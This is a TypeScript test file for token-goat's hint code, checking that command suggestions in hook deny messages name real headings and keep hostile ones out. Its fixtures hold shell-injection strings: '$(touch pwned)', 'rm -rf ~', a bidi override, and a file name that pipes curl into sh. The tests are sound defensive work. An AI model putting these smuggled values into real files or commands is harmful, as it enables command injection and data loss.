/** hint_target.ts: the real name a deny or read hint's command carries, the one command-first shape every site prints, and the shorter second copy of a repeated deny. FIXTURE PROVENANCE: every file body below is HAND-DERIVED, and each expected name is read off that body by hand (the first usable heading, key, table or symbol in file order), never off the resolver. The deny wording asserted through the relay is the handlers' own output, so it is checked for shape (command first, reason kept) rather than restated. */
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { fileURLToPath } from 'node:url'

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import { relayInProcess, buildEvent } from '../src/relay.js'
import { handlersFor, runHook } from '../src/hook_registry.js'
import { DELIVERS_CONTENT_RE, HINT_PLACEHOLDERS, hintTarget, sharpenRepeatedDeny, sliceCommand, sliceForPath, type HintTarget } from '../src/hint_target.js'
import { leadWithCommand, stripUnsafeSuggestions } from '../src/hint_suggestion_guard.js'
import { preBashHandler } from '../src/hooks_bash.js'
import { preReadHandler } from '../src/hooks_read.js'
import { truncatedReadDenyMessage } from '../src/hooks_read_slice.js'
import { preGrepHandler } from '../src/hooks_grep.js'
import { postEditHandler } from '../src/hooks_edit.js'
import { preSkillHandler } from '../src/hooks_skill.js'
import { setSkillOutputsDirForTesting, setSkillsSourceDirForTesting } from '../src/skill_cache.js'
import { planMarkdownOutline } from '../src/fold_structure.js'
import { recordFileRead } from '../src/session.js'
import { normalizePath } from '../src/paths.js'
import { makeHookEvent } from './helpers/hook-event.js'

let dir: string
let seq = 0
const savedEnv: Record<string, string | undefined> = {}

function uniq(prefix: string): string {
  seq += 1
  return `${prefix}-${seq}-${Math.random().toString(36).slice(2, 10)}`
}

function write(rel: string, body: string): string {
  const p = path.join(dir, rel)
  fs.mkdirSync(path.dirname(p), { recursive: true })
  fs.writeFileSync(p, body, 'utf8')
  return p
}

/** A markdown body with one `##` section per heading, each padded to `pad` bytes so the size-gated sites fire. */
function doc(headings: readonly string[], pad = 1500): string {
  const filler = ('Section prose that pads this fixture past the size floors the gated sites apply. ').repeat(Math.ceil(pad / 85)).slice(0, pad)
  if (headings.length === 0) return 'Plain notes with no headings at all.\n\n' + (filler + '\n\n').repeat(6)
  return 'Lead-in paragraph before the first section.\n\n' + headings.map((h) => `## ${h}\n\n${filler}\n`).join('\n')
}

// HAND-DERIVED: six ordinary headings; the first, `Install`, is what every site should name.
const REAL = ['Install', 'Usage', 'Configure', 'Deploy', 'Testing', 'Support'] as const
// HAND-DERIVED: six headings, each carrying something a pasted double-quoted argument cannot hold: a command substitution, a backtick, a quote that closes the argument, the `::` spec separator, a bidi override, a shell variable.
const HOSTILE = ['$(touch pwned)', 'a`id`b', 'x"; rm -rf ~; "y', 'bad::name', 'evil‮txt', '$HOME dir'] as const
const HOSTILE_MARKS = ['pwned', '`id`', 'rm -rf', 'bad::name', '‮', '$HOME']

/** Every `token-goat ...` command span in `text`, up to its closing fence or the end of its line. */
function commandSpans(text: string): string[] {
  return Array.from(text.matchAll(/token-goat [^`\r\n]*/g), (m) => m[0])
}

beforeEach(() => {
  // No clearModuleCaches: it empties the hook registry relay.ts filled at import, and the relay-driven cases below would silently run no handler at all.
  for (const key of ['TOKEN_GOAT_HARNESS_OVERRIDE', 'CLAUDE_CODE_SESSION_ID', 'TOKEN_GOAT_OUTLINE_LARGE_DOCUMENTS']) savedEnv[key] = process.env[key]
  process.env['TOKEN_GOAT_HARNESS_OVERRIDE'] = 'claudecode'
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tg-hint-target-'))
})

afterEach(() => {
  for (const [key, value] of Object.entries(savedEnv)) {
    if (value === undefined) delete process.env[key]
    else process.env[key] = value
  }
  setSkillOutputsDirForTesting(null)
  setSkillsSourceDirForTesting(null)
  fs.rmSync(dir, { recursive: true, force: true })
})

describe('hintTarget names what the file holds', () => {
  it.each([
    // HAND-DERIVED: a lone `#` title is the whole document the deny refused, so the heading after it is named.
    ['doc.md', '# Guide\n\nintro\n\n## Install\n\nsteps\n\n## Usage\n\nmore\n', 'section', 'Install'],
    ['doc.md', '## Alpha\n\ntext\n\n## Beta\n\ntext\n', 'section', 'Alpha'],
    // HAND-DERIVED: a heading that occurs twice is ambiguous to `section`, so the next one is named.
    ['dup.md', '## Notes\n\na\n\n## Notes\n\nb\n\n## Summary\n\nc\n', 'section', 'Summary'],
    ['cfg.toml', 'title = "x"\n\n[server]\nport = 1\n\n[client]\n', 'section', 'server'],
    ['conf.json', '{\n  "alpha": 1,\n  "beta": 2\n}\n', 'key', 'alpha'],
    ['ci.yml', 'name: build\non: push\njobs:\n  a: 1\n', 'key', 'name'],
    ['.env', '# comment\nexport DATABASE_URL=postgres://x\nPORT=1\n', 'key', 'DATABASE_URL'],
    ['schema.sql', '-- init\nCREATE TABLE IF NOT EXISTS "users" (id int);\nCREATE VIEW active AS SELECT 1;\n', 'table', 'users'],
    ['mod.ts', 'import x from "y"\n\nexport function parseConfig(a: string): string {\n  return a\n}\n', 'symbol', 'parseConfig'],
  ] as const)('%s -> %s', (name, body, slice, expected) => {
    const p = write(name, body)
    expect(sliceForPath(p)).toBe(slice)
    expect(hintTarget(p, slice)).toEqual({ name: expected, real: true, slice })
  })

  it('skips a YAML front matter block, which the heading scan reads as a setext heading over its closing ---', () => {
    // HAND-DERIVED: README.md in this repository opens this way; `section "README.md::permalink: /"` runs and returns two lines of metadata.
    const p = write('README.md', '---\nlayout: default\npermalink: /\n---\n\n# Project\n\nintro\n\n## Quick start\n\ntext\n')
    expect(hintTarget(p, 'section').name).toBe('Quick start')
    const text = fs.readFileSync(p, 'utf8')
    expect(hintTarget(p, 'section', { content: text }).name).toBe('Quick start')
  })

  it('prefers the content the caller already holds over the file on disk', () => {
    const p = write('held.md', '## On Disk\n\nx\n')
    expect(hintTarget(p, 'section', { content: '## In Hand\n\ny\n' }).name).toBe('In Hand')
  })

  it.each([
    ['a missing file', 'nope.md', null, 'section'],
    ['a file with no headings', 'plain.md', 'just prose\n', 'section'],
    ['a JSON array, which has no top-level key', 'arr.json', '[1, 2, 3]\n', 'key'],
    ['a SQL file with no CREATE', 'q.sql', 'SELECT 1;\n', 'table'],
  ] as const)('falls back to the placeholder for %s', (_, name, body, slice) => {
    const p = body === null ? path.join(dir, name) : write(name, body)
    expect(hintTarget(p, slice)).toEqual({ name: HINT_PLACEHOLDERS[slice], real: false, slice })
    expect(hintTarget(p, slice, { placeholder: 'HeadingName' }).name).toBe('HeadingName')
  })

  it('refuses every hostile heading and falls back rather than printing one', () => {
    const p = write('hostile.md', doc(HOSTILE, 40))
    expect(hintTarget(p, 'section')).toEqual({ name: 'SectionHeading', real: false, slice: 'section' })
  })

  it('steps past a hostile heading to the next usable one', () => {
    const p = write('mixed.md', '## $(touch pwned)\n\nx\n\n## Install\n\ny\n')
    expect(hintTarget(p, 'section').name).toBe('Install')
  })
})

describe('sliceCommand prints the command each slice runs through', () => {
  const t = (name: string, slice: HintTarget['slice']): HintTarget => ({ name, real: true, slice })
  it.each([
    ['doc.md', t('Install', 'section'), 'token-goat section "doc.md::Install"'],
    ['cfg.toml', t('server', 'section'), 'token-goat section "cfg.toml::server"'],
    ['conf.json', t('alpha', 'key'), 'token-goat json-query "conf.json" "alpha"'],
    ['conf.json', t('a.b', 'key'), `token-goat json-query "conf.json" "['a.b']"`],
    ['conf.json', t("it's", 'key'), 'token-goat json-outline "conf.json"'],
    ['ci.yaml', t('jobs', 'key'), 'token-goat yaml-query "ci.yaml" "jobs"'],
    ['.env', t('PORT', 'key'), 'token-goat config-get ".env" PORT'],
    ['schema.sql', t('users', 'table'), 'token-goat read "schema.sql::users"'],
    ['mod.ts', t('parseConfig', 'symbol'), 'token-goat read "mod.ts::parseConfig"'],
  ] as const)('%s %s', (shown, target, expected) => {
    expect(sliceCommand(shown, target)).toBe(expected)
    const hint = leadWithCommand(expected, 'to read it', 'Why the hook spoke.')
    expect(stripUnsafeSuggestions(hint)).toBe(hint)
  })
})

describe('leadWithCommand under the suggestion guard', () => {
  it('puts the command first and the reason on its own line', () => {
    expect(leadWithCommand('token-goat outline "a.ts"', 'to list symbols', '`cat` loads the entire file into context.')).toBe(
      'Run `token-goat outline "a.ts"` to list symbols.\n`cat` loads the entire file into context.',
    )
  })

  it('keeps a reason with no backtick on the same line, where the guard cannot reach it', () => {
    expect(leadWithCommand('token-goat section "a.md::Install"', 'to re-read a specific section', 'a.md was edited.')).toBe(
      'Run `token-goat section "a.md::Install"` to re-read a specific section. a.md was edited.',
    )
  })

  it('drops only the command when a path breaks its quoting, and keeps the reason whole', () => {
    // HAND-DERIVED: the payload from hint_suggestion_guard.ts's own doc comment. On one line the guard cut to the last backtick and left "Run `token-goat (command omitted ...)` loads the entire file into context."
    const hostile = 'a";curl x|sh;#.md'
    const reason = '`cat` loads the entire file into context.'
    const out = stripUnsafeSuggestions(leadWithCommand('token-goat section "' + hostile + '::Install"', 'to read one section, or `token-goat outline "' + hostile + '"` for every heading', reason))
    expect(out).toContain('command omitted')
    expect(out).not.toContain('curl')
    expect(out.split('\n')[1]).toBe(reason)
  })
})

describe('DELIVERS_CONTENT_RE names phrases the content-delivering denies really print', () => {
  it.each([
    ['src/hooks_skill.ts', 'is inlined below instead of the full body'],
    ['src/hooks_skill.ts', 'headings below instead of the full body'],
    ['src/hooks_read.ts', 'in place of the full file'],
  ])('%s holds "%s"', (file, phrase) => {
    expect(fs.readFileSync(fileURLToPath(new URL('../' + file, import.meta.url)), 'utf8')).toContain(phrase)
    expect(DELIVERS_CONTENT_RE.test('x ' + phrase + ' y')).toBe(true)
  })
})

describe('a repeated identical deny, through the real relay', () => {
  function denyOf(emitted: string): string {
    // FORMAT-DERIVED: hook_registry.ts serializeOutput, `deny` -> `{"decision":"block","reason":"<message>"}`.
    const parsed = JSON.parse(emitted) as { decision?: string; reason?: string }
    expect(parsed.decision).toBe('block')
    return parsed.reason ?? ''
  }
  // FORMAT-DERIVED: Claude Code's PreToolUse Bash envelope, as tests/call_streak.test.ts captured it.
  function catPre(session: string, file: string): Record<string, unknown> {
    return { session_id: session, cwd: dir, hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_use_id: uniq('toolu'), tool_input: { command: 'cat ' + file, description: 'Read' } }
  }

  it('the relay has a Bash pre handler to drive', () => {
    expect(handlersFor('pre_tool_use', 'Bash').length).toBeGreaterThan(0)
  })

  it('gives the second copy as the command and one line, and the first copy in full', async () => {
    write('guide.md', doc(REAL, 200))
    const session = uniq('repeat')
    const first = denyOf(await relayInProcess('pre_tool_use', catPre(session, 'guide.md')))
    const second = denyOf(await relayInProcess('pre_tool_use', catPre(session, 'guide.md')))
    expect(first).toContain('token-goat section "guide.md::Install"')
    expect(first).toContain('`cat` loads the entire file into context.')
    expect(second).toBe('[tg] Run `token-goat section "guide.md::Install"` instead. Repeat refusal of this exact call; the earlier refusal this session has the full reason.')
    expect(second.length).toBeLessThan(first.length)
    // Another session never saw the first copy, so it gets the full text, even from this same process, whose in-memory session state loadSessionState leaves in place for a session with nothing on disk yet.
    const other = denyOf(await relayInProcess('pre_tool_use', catPre(uniq('repeat'), 'guide.md')))
    expect(other).toBe(first)
  })

  it('never cuts a deny that is itself the delivered content', () => {
    const event = makeHookEvent({ toolName: 'Skill', sessionId: uniq('deliver') })
    const out = { hookType: 'deny' as const, message: '[tg] Skill `x` is large; its heading tree (8 headings) is inlined below instead of the full body.\n\n## A' }
    expect(sharpenRepeatedDeny(event, out)).toBe(out)
    expect(sharpenRepeatedDeny(event, out)).toBe(out)
  })
})

interface Site {
  readonly name: string
  /** The text the site prints when it names `heading`. */
  readonly real: (heading: string) => string
  /** The text the site prints when nothing usable was found. */
  readonly fallback: string
  /** Whether the relay's suggestion guard sees this output (deny and context do; a rewritten tool result does not). */
  readonly guarded: boolean
  /** Headings for the fallback case: none where the site speaks without them, the hostile set where it needs headings to speak at all. */
  readonly fallbackHeadings: readonly string[]
  readonly run: (headings: readonly string[]) => Promise<string>
}

const SITES: Site[] = [
  {
    name: 'hooks_bash.ts cat deny',
    real: (h) => 'Run `token-goat section "guide.md::' + h + '"`',
    fallback: 'Run `token-goat section "guide.md::SectionHeading"`',
    guarded: true,
    fallbackHeadings: [],
    run: async (headings) => {
      write('guide.md', doc(headings))
      const out = preBashHandler(makeHookEvent({ toolName: 'Bash', toolInput: { command: 'cat guide.md' }, sessionId: uniq('bash'), raw: { cwd: dir } }))
      if (out.hookType !== 'deny') throw new Error('expected a deny, got ' + out.hookType)
      return out.message
    },
  },
  {
    name: 'hooks_read.ts memory re-read deny',
    real: (h) => '::' + h + '"` to extract one section.',
    fallback: '::SectionHeading"` to extract one section.',
    guarded: true,
    fallbackHeadings: [],
    run: async (headings) => {
      // Small, so the large-markdown heading tree above this branch does not answer first.
      const p = write(path.join(uniq('memory'), 'memory', 'notes.md'), doc(headings, 40))
      recordFileRead(normalizePath(p))
      const out = preReadHandler(makeHookEvent({ toolName: 'Read', toolInput: { file_path: p }, sessionId: uniq('read') }))
      if (out.hookType !== 'deny') throw new Error('expected a deny, got ' + out.hookType)
      return out.message
    },
  },
  {
    name: 'hooks_read.ts large-markdown heading-tree deny',
    real: (h) => '::' + h + '"` to read one section.\n',
    fallback: '::Heading Name"',
    guarded: true,
    fallbackHeadings: HOSTILE,
    run: async (headings) => {
      const p = write(uniq('tree') + '.md', doc(headings))
      recordFileRead(normalizePath(p))
      const out = preReadHandler(makeHookEvent({ toolName: 'Read', toolInput: { file_path: p }, sessionId: uniq('tree') }))
      if (out.hookType !== 'deny') throw new Error('expected a deny, got ' + out.hookType)
      return out.message
    },
  },
  {
    name: 'hooks_read_slice.ts truncated-read deny',
    real: (h) => '::' + h + '"` for one part',
    fallback: 'Run `token-goat skeleton "',
    guarded: true,
    fallbackHeadings: [],
    run: async (headings) => truncatedReadDenyMessage(normalizePath(write(uniq('trunc') + '.md', doc(headings)))),
  },
  {
    name: 'hooks_grep.ts structural heading search',
    real: (h) => 'Run `token-goat section "guide.md::' + h + '"`',
    fallback: 'Run `token-goat section "guide.md::SectionHeading"`',
    guarded: true,
    fallbackHeadings: [],
    run: async (headings) => {
      write('guide.md', doc(headings))
      const out = preGrepHandler(makeHookEvent({ toolName: 'Grep', toolInput: { pattern: '^#', path: 'guide.md' }, sessionId: uniq('grep'), raw: { cwd: dir } }))
      if (out.hookType !== 'context') throw new Error('expected context, got ' + out.hookType)
      return out.context
    },
  },
  {
    name: 'hooks_edit.ts post-edit hint',
    real: (h) => '::' + h + '"` to re-read a specific section',
    fallback: '::HeadingName"` to re-read a specific section',
    guarded: true,
    fallbackHeadings: [],
    run: async (headings) => {
      const p = write(uniq('edited') + '.md', doc(headings))
      const out = postEditHandler(makeHookEvent({ eventName: 'post_tool_use', toolName: 'Write', toolInput: { file_path: p }, sessionId: uniq('edit') }))
      if (out.hookType !== 'context') throw new Error('expected context, got ' + out.hookType)
      return out.context
    },
  },
  {
    name: 'hooks_mcp.ts oversized-result notice',
    real: (h) => '--section "' + h + '"',
    fallback: "--section '<heading>'",
    guarded: false,
    fallbackHeadings: [],
    run: async (headings) => {
      const session = uniq('mcp')
      const out = await runHook(buildEvent('post_tool_use', { session_id: session, tool_name: 'mcp__docs__fetch_page', tool_input: { url: uniq('https://example.test/p') }, tool_response: doc(headings, 5000) }))
      if (out?.hookType !== 'rewriteOutput') throw new Error('expected a rewrite, got ' + out?.hookType)
      return out.updatedOutput ?? ''
    },
  },
  {
    name: 'hooks_skill.ts oversized skill deny',
    real: (h) => 'skill-section SKILL "' + h + '"',
    fallback: "skill-section SKILL '<heading>'",
    guarded: true,
    fallbackHeadings: HOSTILE,
    run: async (headings) => {
      setSkillOutputsDirForTesting(path.join(dir, 'skill-cache'))
      setSkillsSourceDirForTesting(path.join(dir, 'skills'))
      write(path.join('skills', 'SKILL', 'SKILL.md'), doc(headings))
      const out = await preSkillHandler(makeHookEvent({ toolName: 'Skill', toolInput: { skill: 'SKILL' }, sessionId: uniq('skill') }))
      if (out.hookType !== 'deny') throw new Error('expected a deny, got ' + out.hookType)
      return out.message
    },
  },
  {
    name: 'fold_structure.ts large-markdown outline notice',
    real: (h) => 'Run token-goat section "guide.md::' + h + '"',
    fallback: 'Run token-goat section "guide.md::<Heading>"',
    guarded: false,
    fallbackHeadings: HOSTILE,
    run: async (headings) => {
      process.env['TOKEN_GOAT_OUTLINE_LARGE_DOCUMENTS'] = '1'
      const body = doc(headings)
      const rows = body.split('\n').map((text, i) => ({ no: i + 1, text, raw: text }))
      const fold = planMarkdownOutline(rows, normalizePath(path.join(dir, 'guide.md')), 'guide.md', Buffer.byteLength(body, 'utf8'))
      if (fold === null) throw new Error('expected an outline')
      return fold.numbered[0] ?? ''
    },
  },
]

describe.each(SITES)('$name', (site) => {
  it('leads with a heading the file really holds', async () => {
    const text = await site.run(REAL)
    expect(text).toContain(site.real('Install'))
    expect(text).not.toContain(site.fallback)
  })

  it('falls back to the placeholder when nothing usable is found', async () => {
    const text = await site.run(site.fallbackHeadings)
    expect(text).toContain(site.fallback)
  })

  it('prints a command carrying a normal name that the suggestion guard leaves unchanged', async () => {
    const text = await site.run(REAL)
    if (site.guarded) {
      expect(stripUnsafeSuggestions(text)).toBe(text)
    } else {
      const spans = commandSpans(text).filter((s) => s.includes('Install'))
      expect(spans.length).toBeGreaterThan(0)
      for (const s of spans) expect(stripUnsafeSuggestions('`' + s + '`')).toBe('`' + s + '`')
    }
  })

  it('keeps a hostile heading out of every command, so the guard has nothing to drop and the message survives whole', async () => {
    const text = await site.run(HOSTILE)
    expect(text).toContain(site.fallback)
    for (const span of commandSpans(text)) for (const mark of HOSTILE_MARKS) expect(span).not.toContain(mark)
    if (site.guarded) expect(stripUnsafeSuggestions(text)).toBe(text)
  })
})
